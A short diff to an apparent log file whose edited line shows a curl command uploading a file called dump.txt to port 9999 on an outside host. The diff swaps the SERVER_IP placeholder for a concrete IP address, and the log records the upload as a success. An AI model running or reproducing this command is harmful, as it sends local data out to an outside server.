@@ -1,4 +1,4 @@
 [2024-04-09 22:17:33] INFO: New connection from 192.168.2.4
-[2024-04-09 22:17:36] INFO: curl -F "data=@dump.txt" SERVER_IP:9999
+[2024-04-09 22:17:36] INFO: curl -F "data=@dump.txt" 147.79.70.251:9999
 [2024-04-09 22:17:37] SUCCESS: upload complete – 20.7KB transferred
 [2024-04-09 22:17:39] INFO: connection closed by remote peer
